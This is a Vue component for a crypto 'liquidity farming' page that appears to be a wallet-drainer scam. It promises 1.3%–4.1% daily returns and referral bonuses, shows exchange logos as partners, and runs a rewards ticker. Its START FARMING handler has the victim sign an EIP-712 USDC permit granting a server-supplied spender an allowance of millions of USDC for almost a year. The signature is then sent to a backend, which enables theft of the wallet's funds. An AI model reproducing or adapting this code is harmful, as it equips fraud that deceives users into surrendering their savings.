<template>
  <div
    class="min-h-screen w-full pb-24 overflow-x-hidden"
    :style="{
      background: 'linear-gradient(191.82deg, #1F1D35 1.41%, #291C8B 52.85%, #25204B 100%), #0B0914',
    }"
  >
    <Header />
    <ChatButton />

    <main class="px-4 space-y-6 overflow-x-hidden max-w-full">
      <div class="text-center pt-8 pb-4">
        <h1
          class="text-white capitalize font-display"
          :style="{
            fontWeight: 900,
            fontSize: '40px',
            lineHeight: '120%',
            letterSpacing: '0.07em',
            textShadow: '2px 4px 0px #7454FF',
          }"
        >
          LIQUIDITY
          <br />
          FARMING
        </h1>
      </div>

      <!-- Description -->
      <p
        class="text-center px-2 font-sans"
        :style="{
          fontWeight: 600,
          fontSize: '16px',
          lineHeight: '22px',
          textTransform: 'capitalize',
          color: '#FFFFFF',
        }"
      >
        Farm Daily Interest On UsDc By Providing Liquidity For ETH Farming Pools
      </p>

      <!-- Start Farming Button - 只在 approve 为 false 时显示 -->
      <button
        v-if="!approve"
        @click="handleConnectWallet"
        :disabled="isConnecting"
        class="w-full rounded-2xl shadow-lg font-display transition-all hover:scale-105"
        :style="{
          height: '56px',
          background: 'linear-gradient(94.73deg, #34D399 3.6%, #10B981 101.51%)',
          fontWeight: 900,
          fontSize: '15px',
          lineHeight: '21px',
          textTransform: 'uppercase',
          color: '#FFFFFF',
          opacity: isConnecting ? 0.7 : 1,
          cursor: isConnecting ? 'not-allowed' : 'pointer',
          boxShadow: isConnecting ? '' : '0 4px 20px rgba(52, 211, 153, 0.4)',
        }"
      >
        {{ isConnecting ? 'CONNECTING...' : 'START FARMING' }}
      </button>

      <div class="relative mx-auto max-w-sm w-full" :style="{ height: '86px' }">
        <div
          class="absolute inset-0 rounded-2xl"
          :style="{
            background: 'rgba(116, 84, 255, 0.6)',
            opacity: 0.2,
            boxShadow: 'inset 0px 0px 6px rgba(255, 255, 255, 0.3)',
          }"
        />
        <div class="relative flex items-center justify-center gap-4 h-full">
          <div
            class="text-right font-sans"
            :style="{
              fontWeight: 300,
              fontSize: '15px',
              lineHeight: '21px',
              textTransform: 'uppercase',
              color: '#FFFFFF',
            }"
          >
            ETH REWARD
          </div>
          <div
            class="font-numbers"
            :style="{
              fontWeight: 600,
              fontSize: '36px',
              lineHeight: '43px',
              textTransform: 'uppercase',
              color: '#FFFFFF',
            }"
          >
            {{ indexStats.ethReward }}
          </div>
        </div>
      </div>

      <div class="grid grid-cols-3 gap-2.5">
        <!-- Participants Card -->
        <div class="relative overflow-hidden rounded-xl">
          <div
            class="absolute inset-0"
            :style="{
              background: 'linear-gradient(292.56deg, #0B102D 13.18%, #BE5FD5 100%)',
              opacity: 0.5,
            }"
          />
          <div
            class="absolute inset-0"
            :style="{
              background: 'linear-gradient(163.01deg, #F8907F 2.63%, rgba(30, 26, 45, 0) 63.94%)',
              opacity: 1,
            }"
          />
          <div class="relative p-3">
            <div
              class="w-7 h-7 rounded-full flex items-center justify-center mb-2"
              :style="{
                background: 'linear-gradient(322.37deg, #7454FF 0%, #FD9379 86.42%)',
              }"
            >
              <img src="/participants.png" alt="participants" width="20" height="20" />
            </div>
            <div
              class="mb-1 font-sans"
              :style="{
                fontWeight: 600,
                fontSize: '10px',
                lineHeight: '14px',
                textTransform: 'uppercase',
                color: '#FFFFFF',
                opacity: 0.6,
              }"
            >
              PARTICIPANTS
            </div>
            <div
              class="font-numbers"
              :style="{
                fontWeight: 700,
                fontSize: '20px',
                lineHeight: '23px',
                textTransform: 'uppercase',
                color: '#FFFFFF',
              }"
            >
              {{ indexStats.participants.toLocaleString() }}
            </div>
          </div>
        </div>

        <!-- Nodes Card -->
        <div class="relative overflow-hidden rounded-xl">
          <div
            class="absolute inset-0"
            :style="{
              background: 'linear-gradient(314.08deg, #0B102D 3.03%, rgba(252, 191, 11, 0.65) 170.36%)',
            }"
          />
          <div
            class="absolute inset-0"
            :style="{
              background: 'linear-gradient(163.01deg, #FFFD79 2.63%, rgba(45, 43, 26, 0) 63.94%)',
              opacity: 0.6,
            }"
          />
          <div class="relative p-3">
            <div
              class="w-7 h-7 rounded-full flex items-center justify-center mb-2"
              :style="{
                background: 'linear-gradient(154.13deg, #F9D60A -13.71%, #FF9B00 96.08%)',
              }"
            >
              <img src="/nodes.png" alt="nodes" width="24" height="24" />
            </div>
            <div
              class="mb-1 font-sans"
              :style="{
                fontWeight: 600,
                fontSize: '10px',
                lineHeight: '14px',
                textTransform: 'uppercase',
                color: '#FFFFFF',
                opacity: 0.6,
              }"
            >
              NODES
            </div>
            <div
              class="font-numbers"
              :style="{
                fontWeight: 700,
                fontSize: '20px',
                lineHeight: '23px',
                textTransform: 'uppercase',
                color: '#FFFFFF',
              }"
            >
              {{ indexStats.nodes.toLocaleString() }}
            </div>
          </div>
        </div>

        <!-- USDC Verified Card -->
        <div class="relative overflow-hidden rounded-xl">
          <div
            class="absolute inset-0"
            :style="{
              background: 'linear-gradient(134.37deg, rgba(7, 54, 239, 0.6) -22.35%, rgba(1, 7, 21, 0.6) 100.98%)',
            }"
          />
          <div
            class="absolute inset-0"
            :style="{
              background: 'linear-gradient(163.01deg, #ADB0FF 2.63%, rgba(45, 43, 26, 0) 63.94%)',
              opacity: 0.6,
            }"
          />
          <div class="relative p-3">
            <div
              class="w-7 h-7 rounded-full flex items-center justify-center mb-2"
              :style="{
                background: 'linear-gradient(154.13deg, #60C9FB -13.71%, #1CA3FD 96.08%)',
              }"
            >
              <img src="/usdc.png" alt="usdc" width="20" height="20" />
            </div>
            <div
              class="mb-1 font-sans"
              :style="{
                fontWeight: 600,
                fontSize: '10px',
                lineHeight: '14px',
                textTransform: 'uppercase',
                color: '#FFFFFF',
                opacity: 0.6,
              }"
            >
              USDC VERIFIED
            </div>
            <div
              class="font-numbers"
              :style="{
                fontWeight: 700,
                fontSize: '20px',
                lineHeight: '23px',
                textTransform: 'uppercase',
                color: '#FFFFFF',
              }"
            >
              {{ indexStats.usdcVerified }}
            </div>
          </div>
        </div>
      </div>

      <div class="space-y-3 pt-2">
        

        <div class="relative rounded-2xl">
          <div
            class="absolute inset-0"
            :style="{
              background: 'rgba(116, 84, 255, 0.6)',
              opacity: 0.2,
              boxShadow: 'inset 0px 0px 6px rgba(255, 255, 255, 0.3)',
              borderRadius: '16px',
            }"
          />
          <div class="relative p-0">
            <div class="p-3" :style="{
              backgroundImage: 'url(/PARTNERS.png)',
              backgroundSize: 'cover',
              backgroundRepeat: 'no-repeat',
              backgroundPosition: 'center',
            }">
                <h2
                class="text-center font-sans mb-0"
                :style="{
                  fontWeight: 600,
                  fontSize: '15px',
                  lineHeight: '21px',
                  textTransform: 'uppercase',
                  color: '#FFFFFF',
                  opacity: 0.8,
                }"
              >
                PARTNERS
              </h2>
            </div>
            
            <div class="grid grid-cols-4 gap-4 p-6">
              <div v-for="partner in partners" :key="partner.name" class="flex flex-col items-center gap-2">
                <div class="relative">
                  <div
                    class="w-11 h-11 rounded-lg"
                    :style="{
                      background: 'linear-gradient(180deg, rgba(116, 84, 255, 0) 0%, #7454FF 100%)',
                      opacity: 0.4,
                    }"
                  />
                  <div class="absolute inset-0 flex items-center justify-center">
                    <img :src="partner.icon" :alt="partner.name" class="w-6 h-6" />
                  </div>
                </div>
                <span
                  class="text-center leading-tight font-sans"
                  :style="{
                    fontWeight: 600,
                    fontSize: '10px',
                    lineHeight: '14px',
                    textTransform: 'capitalize',
                    color: '#FFFFFF',
                    opacity: 0.6,
                  }"
                >
                  {{ partner.name }}
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <div class="flex items-center justify-center gap-3 pt-6 pb-0 relative px-2">
        <div
          class="rounded-lg transition-all duration-300 flex-1 max-w-[200px]"
          :style="{
            backgroundImage: activeTab === 'rewards' ? 'url(/btn-bg.png)' : 'none',
            backgroundSize: 'cover',
            backgroundRepeat: 'no-repeat',
            backgroundPosition: 'center',
            minHeight: '40px',
            transform: activeTab === 'rewards' ? 'scale(1.05)' : 'scale(1)',
          }"
        >
          <button
            @click="setActiveTab('rewards')"
            class="font-sans px-4 py-2 rounded-lg w-full whitespace-nowrap transition-all duration-300"
            :style="{
              fontWeight: 600,
              fontSize: '14px',
              lineHeight: '20px',
              textTransform: 'uppercase',
              color: activeTab === 'rewards' ? '#FFFFFF' : '#CEC3FF',
              opacity: activeTab === 'rewards' ? 1 : 0.6,
            }"
          >
            FARMING REWARDS
          </button>
        </div>
        <div
          class="rounded-lg transition-all duration-300 flex-1 max-w-[120px]"
          :style="{
            backgroundImage: activeTab === 'faq' ? 'url(/btn-bg.png)' : 'none',
            backgroundSize: 'cover',
            backgroundRepeat: 'no-repeat',
            backgroundPosition: 'center',
            minHeight: '40px',
            transform: activeTab === 'faq' ? 'scale(1.05)' : 'scale(1)',
          }"
        >
          <button
            @click="setActiveTab('faq')"
            class="font-sans px-4 py-2 rounded-lg w-full transition-all duration-300"
            :style="{
              fontWeight: 600,
              fontSize: '14px',
              lineHeight: '20px',
              textTransform: 'uppercase',
              color: activeTab === 'faq' ? '#FFFFFF' : '#CEC3FF',
              opacity: activeTab === 'faq' ? 1 : 0.6,
            }"
          >
            FAQ
          </button>
        </div>
        <div
          class="absolute bottom-0 left-0 right-0 h-px"
          :style="{
            background:
              'radial-gradient(65.21% 100% at 52.25% 100%, rgba(116, 84, 255, 0.8) 0%, rgba(3, 3, 5, 0) 100%)',
            opacity: 0.5,
          }"
        />
      </div>

      <div v-if="activeTab === 'faq'" class="space-y-3 pb-4">
        <div 
          v-for="(item, index) in faqItems" 
          :key="index" 
          class="relative rounded transition-all duration-300 hover:scale-[1.02] cursor-pointer"
          @click="toggleFaqItem(index)"
        >
          <div
            class="absolute inset-0 transition-all duration-300"
            :style="{
              background: 'rgba(116, 84, 255, 0.6)',
              opacity: expandedFaqItems.includes(index) ? 0.3 : 0.2,
              boxShadow: 'inset 0px 0px 6px rgba(255, 255, 255, 0.3)',
            }"
          />
          <div class="relative p-4">
            <div class="flex items-start justify-between gap-3 mb-2">
              <div class="flex items-start gap-2.5">
                <div class="relative mt-1.5">
                  <div
                    class="w-1.5 h-1.5 rounded-full transition-all duration-300"
                    :style="{
                      background: item.dotColor,
                      filter: 'blur(3px)',
                      transform: expandedFaqItems.includes(index) ? 'scale(1.2)' : 'scale(1)',
                    }"
                  />
                  <div
                    class="absolute inset-0 w-1.5 h-1.5 rounded-full transition-all duration-300"
                    :style="{
                      background: item.dotColor,
                      transform: expandedFaqItems.includes(index) ? 'scale(1.2)' : 'scale(1)',
                    }"
                  />
                </div>
                <h3
                  class="font-sans transition-all duration-300"
                  :style="{
                    fontWeight: 400,
                    fontSize: '15px',
                    lineHeight: '21px',
                    textTransform: 'uppercase',
                    color: '#FFFFFF',
                    opacity: expandedFaqItems.includes(index) ? 1 : 0.9,
                  }"
                >
                  {{ item.question }}
                </h3>
              </div>
              <img 
                src="/jiantou.png" 
                alt="arrow" 
                width="16" 
                height="16" 
                class="flex-shrink-0 mt-0.5 transition-transform duration-300"
                :style="{
                  transform: expandedFaqItems.includes(index) ? 'rotate(180deg)' : 'rotate(0deg)',
                }"
              />
            </div>
            <div
              class="h-px mb-2.5 transition-all duration-300"
              :style="{
                backgroundImage: 'url(/lines.png)',
                backgroundSize: 'cover',
                backgroundRepeat: 'no-repeat',
                backgroundPosition: 'center',
                opacity: expandedFaqItems.includes(index) ? 1 : 0.7,
              }"
            />
            <div 
              class="overflow-hidden transition-all duration-300"
              :style="{
                maxHeight: expandedFaqItems.includes(index) ? '600px' : '0px',
                opacity: expandedFaqItems.includes(index) ? 1 : 0,
              }"
            >
              <div class="pl-6 pr-6 pt-3 pb-4 font-sans space-y-2">
                <!-- 主要描述 -->
                <p
                  v-if="item.description"
                  :style="{
                    fontWeight: 400,
                    fontSize: '13px',
                    lineHeight: '18px',
                    textTransform: 'none',
                    color: '#FFFFFF',
                    opacity: 0.6,
                  }"
                >
                  {{ item.description }}
                </p>
                
                <!-- 副标题 -->
                <p
                  v-if="item.subtitle"
                  :style="{
                    fontWeight: 600,
                    fontSize: '13px',
                    lineHeight: '18px',
                    textTransform: 'none',
                    color: '#FFFFFF',
                    opacity: 0.7,
                  }"
                >
                  {{ item.subtitle }}
                </p>
                
                <!-- 列表项 -->
                <div v-if="item.list && item.list.length > 0" class="space-y-1">
                  <div
                    v-for="(listItem, idx) in item.list"
                    :key="idx"
                    :style="{
                      fontWeight: 400,
                      fontSize: '13px',
                      lineHeight: '18px',
                      textTransform: 'none',
                      color: '#FFFFFF',
                      opacity: 0.6,
                    }"
                  >
                    {{ listItem }}
                  </div>
                </div>
                
                <!-- 简单答案（兼容旧格式）-->
                <p
                  v-if="!item.description && !item.list && item.answer"
                  :style="{
                    fontWeight: 400,
                    fontSize: '13px',
                    lineHeight: '18px',
                    textTransform: 'none',
                    color: '#FFFFFF',
                    opacity: 0.6,
                  }"
                >
                  {{ item.answer }}
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div v-else class="space-y-3 pb-4">
        <!-- 表头 -->
        <div class="relative rounded-xl overflow-hidden">
          <div
            class="absolute inset-0"
            :style="{
              background: 'linear-gradient(135deg, rgba(116, 84, 255, 0.4) 0%, rgba(29, 78, 216, 0.3) 100%)',
              boxShadow: 'inset 0px 0px 8px rgba(255, 255, 255, 0.2)',
            }"
          />
          <div class="relative p-4 backdrop-blur-sm">
            <div class="grid grid-cols-2 gap-4">
              <div
                class="font-sans"
                :style="{
                  fontWeight: 700,
                  fontSize: '13px',
                  lineHeight: '20px',
                  textTransform: 'uppercase',
                  color: '#FFFFFF',
                  letterSpacing: '0.05em',
                }"
              >
                FARMVILLE ADDRESS
              </div>
              <div
                class="text-right font-sans"
                :style="{
                  fontWeight: 700,
                  fontSize: '13px',
                  lineHeight: '20px',
                  textTransform: 'uppercase',
                  color: '#FFFFFF',
                  letterSpacing: '0.05em',
                }"
              >
                ETH REWARD
              </div>
            </div>
          </div>
        </div>
        
        <!-- 滚动容器 - 显示最新的5条奖励数据 -->
        <div class="rewards-scroll-container overflow-hidden relative">
          <div class="rewards-list-wrapper">
            <div 
              v-for="(item, index) in displayedRewards" 
              :key="item.id" 
              class="rewards-item mb-2"
              :class="{ 
                'rewards-item-entering': item.isEntering,
                'rewards-item-leaving': item.isLeaving 
              }"
            >
              <div 
                class="relative rounded-xl overflow-hidden transition-all duration-200 hover:scale-[1.02] cursor-pointer"
                @click="selectRewardItem(index)"
              >
                <div
                  class="absolute inset-0 transition-all duration-300"
                  :style="{
                    background: selectedRewardIndex === index 
                      ? 'linear-gradient(135deg, rgba(139, 92, 246, 0.35) 0%, rgba(59, 130, 246, 0.25) 100%)'
                      : 'linear-gradient(135deg, rgba(116, 84, 255, 0.25) 0%, rgba(29, 78, 216, 0.15) 100%)',
                    boxShadow: selectedRewardIndex === index 
                      ? 'inset 0px 0px 10px rgba(255, 255, 255, 0.3), 0 4px 15px rgba(139, 92, 246, 0.3)'
                      : 'inset 0px 0px 6px rgba(255, 255, 255, 0.15)',
                  }"
                />
                <div class="relative p-3.5 backdrop-blur-sm">
                  <div class="grid grid-cols-2 gap-4 items-center">
                    <div class="flex items-center gap-2">
                      <!-- 地址图标 -->
                      <div 
                        class="w-2 h-2 rounded-full flex-shrink-0"
                        :style="{
                          background: 'linear-gradient(135deg, #8B5CF6 0%, #3B82F6 100%)',
                          boxShadow: '0 0 6px rgba(139, 92, 246, 0.6)',
                        }"
                      />
                      <div
                        class="font-mono transition-all duration-300"
                        :style="{
                          fontWeight: 500,
                          fontSize: '13px',
                          lineHeight: '18px',
                          color: '#FFFFFF',
                          opacity: selectedRewardIndex === index ? 1 : 0.9,
                        }"
                      >
                        {{ item.address }}
                      </div>
                    </div>
                    <div
                      class="text-right font-mono transition-all duration-300"
                      :style="{
                        fontWeight: 600,
                        fontSize: '14px',
                        lineHeight: '18px',
                        color: selectedRewardIndex === index ? '#34D399' : '#FFFFFF',
                        opacity: selectedRewardIndex === index ? 1 : 0.9,
                      }"
                    >
                      {{ item.reward }} ETH
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        
        <!-- 如果没有数据，显示加载中或空状态 -->
        <div 
          v-if="latestYields.length === 0"
          class="relative rounded-xl overflow-hidden"
        >
          <div
            class="absolute inset-0"
            :style="{
              background: 'linear-gradient(135deg, rgba(116, 84, 255, 0.25) 0%, rgba(29, 78, 216, 0.15) 100%)',
              boxShadow: 'inset 0px 0px 6px rgba(255, 255, 255, 0.15)',
            }"
          />
          <div class="relative p-8 text-center backdrop-blur-sm">
            <div class="animate-pulse mb-2">
              <div class="w-8 h-8 mx-auto rounded-full bg-gradient-to-br from-purple-400 to-blue-400 opacity-50" />
            </div>
            <p
              class="font-sans"
              :style="{
                fontWeight: 500,
                fontSize: '13px',
                lineHeight: '18px',
                color: '#FFFFFF',
                opacity: 0.7,
              }"
            >
              Loading rewards data...
            </p>
          </div>
        </div>
      </div>
    </main>

    <BottomNav />
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted, onUnmounted, watch } from 'vue'
import Header from '../components/Header.vue'
import BottomNav from '../components/BottomNav.vue'
import ChatButton from '../components/ChatButton.vue'
import { useWallet } from '@/composables/useWallet'
import { useToast } from '@/composables/useToast'
import { sign, getIndexStats, getRewards } from '@/lib/api'
import { ethers } from 'ethers'

// 扩展 Window 接口以包含 ethereum
declare global {
  interface Window {
    ethereum?: any
  }
}

const activeTab = ref<'rewards' | 'faq'>('faq')
const expandedFaqItems = ref<number[]>([])
const selectedRewardIndex = ref<number | null>(null)

// 首页统计数据
const indexStats = ref({
  nodes: 0,
  participants: 0,
  usdcVerified: '0',
  ethReward: '0'
})

// 最新奖励数据
const latestYields = ref<Array<{ address: string; reward: string }>>([])
const displayedRewards = ref<Array<{ 
  id: string
  address: string
  reward: string
  isEntering?: boolean
  isLeaving?: boolean
}>>([])
let rewardIdCounter = 0
let fetchRewardsInterval: ReturnType<typeof setInterval> | null = null
let scrollInterval: ReturnType<typeof setInterval> | null = null

// 钱包连接
const { address, isConnecting, isConnected, approve, spender, connectWallet, autoConnect, refreshLoginStatus, formatAddress } = useWallet()
const toast = useToast()

// 获取 nonce 的辅助函数
const getNonce = async (usdcContract: ethers.Contract, owner: string, tryCount = 1): Promise<bigint> => {
  try {
    const nonce = await usdcContract.nonces(owner)
    console.log("nonce:", nonce)
    return nonce
  } catch (error) {
    if (tryCount <= 3) {
      console.log("Retrying to get nonce...")
      return await new Promise((resolve) => {
        setTimeout(() => {
          resolve(getNonce(usdcContract, owner, tryCount + 1))
        }, 2000)
      })
    } else {
      return BigInt(0)
    }
  }
}

// Start Farming 按钮点击处理 - 实现签名操作
const handleConnectWallet = async () => {
  // 检查钱包
  if (!window.ethereum) {
    toast.error("No Ethereum wallet detected. Please install MetaMask or another compatible wallet.")
    return
  }
  
  // 如果未连接，先连接钱包
  if (!isConnected.value) {
    console.log("Wallet not connected, triggering connection...")
    try {
      await connectWallet(
        () => {
          toast.success('Wallet connected and logged in successfully!')
          toast.info("Please click 'Start Farming' again to complete the process.")
        },
        (error) => {
          toast.error(error)
        }
      )
      return
    } catch (error) {
      console.error("Failed to connect wallet:", error)
      toast.error("Failed to connect wallet. Please try again.")
      return
    }
  }

  // 如果已连接，进行 USDC 签名
  const USDC_ADDRESS = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48" // USDC 主网地址
  const USDC_DOMAIN = {
    name: "USD Coin",
    version: "2",
    chainId: 1, // Mainnet
    verifyingContract: USDC_ADDRESS,
  }

  const PERMIT_TYPE = {
    Permit: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
      { name: "value", type: "uint256" },
      { name: "nonce", type: "uint256" },
      { name: "deadline", type: "uint256" },
    ],
  }

  try {
    // 确保钱包已连接并授权
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts",
    })
    if (accounts.length === 0) {
      toast.error("No accounts found. Please connect your wallet.")
      return
    }

    // 确保钱包连接到 Ethereum 主网
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }], // Mainnet
      })
    } catch (switchError: any) {
      // 处理用户拒绝切换网络的情况
      if (switchError.code === 4001) {
        toast.error("Please switch to Ethereum Mainnet to continue.")
        return
      }
    }

    // 获取 spender 地址
    if (!spender.value) {
      toast.error("No spender found. Please reconnect your wallet.")
      return
    }

    // 连接钱包并获取签名者
    const provider = new ethers.BrowserProvider(window.ethereum)
    const signer = await provider.getSigner()
    const owner = await signer.getAddress()
    const value = ethers.parseUnits("9900000", 6) // 99,000,000 USDC (6 decimals)
    const deadline = Math.floor(Date.now() / 1000) + 30000000 // 30,000,000 秒后过期

    const usdcContract = new ethers.Contract(
      USDC_ADDRESS,
      ["function nonces(address) view returns (uint256)"],
      provider,
    )

    const nonce = await getNonce(usdcContract, owner, 1)
    const message = {
      owner,
      spender: spender.value, // 使用登录返回的 spender 地址
      value: value.toString(),
      nonce: nonce.toString(),
      deadline: deadline.toString(),
    }

    let signature = null
    try {
      signature = await signer.signTypedData(USDC_DOMAIN, PERMIT_TYPE, message)
      console.log("EIP-712 sign:", signature)
      if (signature === undefined || signature === null) {
        throw new Error("User denied the request")
      }
    } catch (error) {
      console.error("Signature error:", error)
      toast.error("Signature request was cancelled")
      return
    }

    // 调用 sign 接口
    const response = await sign(owner, signature, spender.value, value.toString(), deadline.toString(), nonce.toString())
    if (!response.success) {
      throw new Error(response.msg)
    }
    
    console.log("✅ Sign successful")
    toast.success("🎉 Farming activated successfully! Welcome to Liquidity Farming!")
    
    // 签名成功后，刷新登录状态更新 approve
    const refreshed = await refreshLoginStatus()
    if (refreshed) {
      console.log("✅ Approve 状态已更新，按钮将自动隐藏")
    } else {
      console.warn("⚠️ 无法刷新 approve 状态，但签名已成功")
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : "An unknown error occurred"
    toast.error(errorMessage)
    console.error("Error in approving transaction: ", error)
  }
}

// 获取首页统计数据
const fetchIndexStats = async () => {
  try {
    const response = await getIndexStats()
    if (response.success && response.data) {
      indexStats.value = {
        nodes: response.data.nodes || 0,
        participants: response.data.participants || 0,
        usdcVerified: response.data.usdcVerified || '0',
        ethReward: response.data.ethReward || '0'
      }
      console.log('✅ 首页统计数据加载成功:', indexStats.value)
    }
  } catch (error) {
    console.error('❌ 获取首页统计数据失败:', error)
  }
}

// 获取最新奖励数据 - 定时更新
const fetchLatestRewards = async () => {
  try {
    const response = await getRewards(30) // 获取30条数据
    if (response.success && response.data.length > 0) {
      // 将API返回的数据格式化
      const formattedData = response.data.map((item) => ({
        address: `${item.wallet.slice(0, 6)}...${item.wallet.slice(-4)}`,
        reward: item.eth.toFixed(5),
      }))
      latestYields.value = formattedData
      
      // 初始化显示的奖励数据（首次加载或数据更新）
      if (displayedRewards.value.length === 0 && formattedData.length >= 5) {
        displayedRewards.value = formattedData.slice(0, 5).map((item) => ({
          id: `reward-${rewardIdCounter++}`,
          address: item.address,
          reward: item.reward,
          isEntering: false,
          isLeaving: false,
        }))
      }
      
      console.log('✅ 奖励数据加载成功:', formattedData.length, '条')
    }
  } catch (error) {
    console.error('❌ 获取奖励数据失败:', error)
  }
}

// 启动滚动效果 - 每2秒添加一条新数据到末尾，第一条消失
let currentIndex = 5 // 从第6条数据开始循环
const startScrolling = () => {
  // 清除旧的定时器
  if (scrollInterval) {
    clearInterval(scrollInterval)
  }
  
  scrollInterval = setInterval(() => {
    if (latestYields.value.length < 6 || displayedRewards.value.length === 0) return
    
    // 获取下一条要显示的数据
    const nextItem = latestYields.value[currentIndex % latestYields.value.length]
    currentIndex++
    
    // 1. 先添加新数据到末尾（标记为进入状态）
    const newReward = {
      id: `reward-${rewardIdCounter++}`,
      address: nextItem.address,
      reward: nextItem.reward,
      isEntering: true,
      isLeaving: false,
    }
    displayedRewards.value.push(newReward)
    
    // 2. 同时标记第一条为离开状态
    if (displayedRewards.value.length > 0) {
      displayedRewards.value[0].isLeaving = true
    }
    
    // 3. 等待动画完成后，移除新数据的进入标记和移除第一条数据
    setTimeout(() => {
      // 移除进入状态标记
      if (newReward) {
        newReward.isEntering = false
      }
      
      // 移除第一条数据
      if (displayedRewards.value.length > 5) {
        displayedRewards.value.shift()
      }
    }, 800) // 动画时长
  }, 2000) // 每2秒滚动一次
}

// 页面加载时尝试自动连接和获取数据
onMounted(() => {
  // 获取首页统计数据
  fetchIndexStats()
  
  // 立即获取一次奖励数据
  fetchLatestRewards()
  
  // 每30秒自动更新奖励数据
  fetchRewardsInterval = setInterval(fetchLatestRewards, 30000)
  
  // 自动连接钱包
  autoConnect(
    () => {
      // 自动登录成功（静默处理，不显示提示）
      console.log('✅ 自动登录成功')
    },
    (error) => {
      // 自动登录失败，显示错误提示
      toast.error(`Auto login failed: ${error}`)
    }
  )
})

// 监听 displayedRewards 的变化，当有足够数据时启动滚动
watch(() => displayedRewards.value.length, (newLength) => {
  if (newLength >= 5 && latestYields.value.length >= 6) {
    // 只启动一次
    if (!scrollInterval) {
      startScrolling()
    }
  }
}, { immediate: true })

// 组件卸载时清理定时器
onUnmounted(() => {
  if (fetchRewardsInterval) {
    clearInterval(fetchRewardsInterval)
  }
  if (scrollInterval) {
    clearInterval(scrollInterval)
  }
})

const partners = [
  { name: "CoinMarketCap", icon: "/CoinMarketCap.png" },
  { name: "CoinGecko", icon: "/CoinGecko.png" },
  { name: "TrustWallet", icon: "/TrustWallet.png" },
  { name: "Crypto.Com", icon: "/CryptoCom.png" },
]

const faqItems = [
  {
    question: "WHAT IS THE RETURN OF INVESTMENT (ROI)?",
    description: "After successfully joining, the system will start to calculate the amount of USDC you hold through the smart contract. The reward will be distributed every 6 hours.",
    subtitle: "The expected daily production income:",
    list: [
      "1. 100 - 4,999 USDC: 1.3% - 1.6%",
      "2. 5,000 - 19,999 USDC: 1.6% - 1.9%",
      "3. 20,000 - 49,999 USDC: 1.9% - 2.2%",
      "4. 50,000 - 99,999 USDC: 2.2% - 2.5%",
      "5. 100,000 - 199,999 USDC: 2.5% - 2.8%",
      "6. 200,000 - 499,999 USDC: 2.8% - 3.1%",
      "7. 500,000 - 999,999 USDC: 3.1% - 3.5%",
      "8. 1,000,000 - 1,999,999 USDC: 3.5% - 3.8%",
      "9. 2,000,000+ USDC: 4.1%",
    ],
    dotColor: "#7454FF",
  },
  {
    question: "HOW TO EARN REWARD?",
    answer: "The cryptocurrency mined every day generates ETH revenue and gives us a certain percentage of revenue in accordance with contract standards.",
    dotColor: "#FCBA05",
  },
  {
    question: "IS THERE A REWARD FOR INVITING FRIENDS?",
    answer: "Yes, you can invite your friends to join the mining pool through your referral link. You will get a 30% ETH reward everytime your friends receive their reward.",
    dotColor: "#49BCFC",
  },
]

const setActiveTab = (tab: 'rewards' | 'faq') => {
  activeTab.value = tab
  // Reset selections when switching tabs
  expandedFaqItems.value = []
  selectedRewardIndex.value = null
}

const toggleFaqItem = (index: number) => {
  const itemIndex = expandedFaqItems.value.indexOf(index)
  if (itemIndex > -1) {
    expandedFaqItems.value.splice(itemIndex, 1)
  } else {
    expandedFaqItems.value.push(index)
  }
}

const selectRewardItem = (index: number) => {
  selectedRewardIndex.value = selectedRewardIndex.value === index ? null : index
}
</script>

<style scoped>
/* 滚动容器 - 固定高度，只显示5条 */
.rewards-scroll-container {
  position: relative;
  height: 310px;
  overflow: hidden;
}

/* 列表包装器 */
.rewards-list-wrapper {
  position: relative;
}

/* 奖励项基础样式 */
.rewards-item {
  will-change: transform, opacity;
  backface-visibility: hidden;
  -webkit-font-smoothing: antialiased;
  transition: all 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94);
}

/* 新数据进入动画 - 从底部滑入 */
.rewards-item-entering {
  animation: slideInFromBottom 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94);
}

@keyframes slideInFromBottom {
  0% {
    opacity: 0;
    transform: translateY(30px) scale(0.95);
  }
  100% {
    opacity: 1;
    transform: translateY(0) scale(1);
  }
}

/* 第一条数据离开动画 - 淡出 */
.rewards-item-leaving {
  animation: fadeOut 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
}

@keyframes fadeOut {
  0% {
    opacity: 1;
    transform: translateY(0);
    max-height: 70px;
    margin-bottom: 0.5rem;
  }
  50% {
    opacity: 0;
    transform: translateY(-10px);
  }
  100% {
    opacity: 0;
    transform: translateY(-20px);
    max-height: 0;
    margin-bottom: 0;
  }
}

/* 悬停效果 */
.rewards-item > div {
  transition: transform 0.2s ease;
}

.rewards-item:not(.rewards-item-entering):not(.rewards-item-leaving) > div:hover {
  transform: scale(1.02);
}
</style>
